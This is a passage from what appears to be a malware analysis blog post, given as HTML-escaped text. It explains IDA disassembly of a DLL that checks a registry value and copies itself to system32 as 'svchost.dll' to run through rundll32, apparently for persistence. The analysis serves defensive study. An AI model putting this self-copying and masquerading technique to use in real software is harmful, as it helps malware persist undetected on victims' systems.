&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;RegQueryValueEx&lt;/a&gt; checks if there is a registry key at an open path. It is looking for a registry key named &lt;code&gt;svchost&lt;/code&gt; at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for &lt;code&gt;ERROR_FILE_NOT_FOUND&lt;/code&gt; meaning there was no such key. Then it will call &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;RegCloseKey&lt;/a&gt; and closes the open registry path. This function&amp;rsquo;s return value is saved in &lt;code&gt;var_110&lt;/code&gt; (we will need it later):&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;.
|           Condition          |         Return Value          |
|------------------------------|-------------------------------|
|Registry key cannot be opened |               1               |
|Registry key does not exist   |               2               |
|Registry key exists           | 1000A6BB or DllMain(x,x,x)+3B |
.
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After that function, we see that it is calling &lt;code&gt;GetModuleHandleEx&lt;/code&gt; for &lt;code&gt;sub_1000A610&lt;/code&gt; in lines 3-8 and checks the return value in line 9. The return value for &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;GetModuleHandleEx&lt;/a&gt; will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Returning from sub_1000A570&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6BB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_1000A570&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6C0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_110&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;              &lt;span style=&#34;color: #586E75&#34;&gt;; return value stored in var_110&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6C6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;phModule&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6D0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;phModule&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6D6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; phModule&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6D7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub_1000A610&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpModuleName&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6DC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;                               &lt;span style=&#34;color: #586E75&#34;&gt;; dwFlags&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6DE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GetModuleHandleExA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6E4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6E6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A711&lt;/span&gt;              &lt;span style=&#34;color: #586E75&#34;&gt;; if (eax!=0) jmp loc_1000A711&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6E8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GetLastError&lt;/span&gt;                 &lt;span style=&#34;color: #586E75&#34;&gt;; if (eax==0) print LastError to file&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6EE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_120&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6F4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_120&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6FA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A6FB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aGetmodulehandl&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;GetModuleHandle returned %d\n&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A700&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_1000AD77&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A705&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A708&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; FILE *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A709&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_fprintf&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A70E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Ch&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;If &lt;code&gt;GetModuleHandleEx&lt;/code&gt; was successful it will land here. &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;GetModuleFileName&lt;/a&gt; is called which will return the full path for the specified module in &lt;code&gt;hModule&lt;/code&gt;. In this case, the binary retrieves its own path (line 9) and saves it in &lt;code&gt;[ebp+Filename]&lt;/code&gt;. In line 10, return value of &lt;code&gt;sub_1000A570&lt;/code&gt; is compared with 2.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Getting Dll path&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A711&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A711&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A711&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A711&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;100h&lt;/span&gt;            &lt;span style=&#34;color: #586E75&#34;&gt;; nSize&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A716&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Filename&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A71C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpFilename&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A71D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;phModule&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A723&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; hModule&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A724&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GetModuleFileNameA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A72A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_110&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color: #586E75&#34;&gt;; comparing return value of sub_1000A570 with 2&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A731&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A772&lt;/span&gt;         &lt;span style=&#34;color: #586E75&#34;&gt;; if return value is not 2, then jump to loc_1000A772&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;If registry key did not exist, we will continue.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;CopyFile&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A733&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lpNewFileName&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aCWindowsSystem&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;c:\\windows\\system32\\svchost.dll&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A73D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_124&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aCWindowsSyst_0&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A747&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; bFailIfExists - 0 means overwrite if file already exists&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A749&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lpNewFileName&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A74F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpNewFileName ; &amp;quot;c:\\windows\\system32\\svchost.dll&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A750&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Filename&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A756&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpExistingFileName - Dll name from GetModuleFileName&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A757&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CopyFileA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A75D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_124&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; From line 2&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A763&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A764&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_1000A610&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A769&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A76C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_114&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We have already seen the strings being loaded in lines 1 and 2. Then &lt;code&gt;CopyFile&lt;/code&gt; is called to copy itself to &lt;code&gt;c:\\windows\\system32\\svchost.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;sub_1000A610&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A610&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
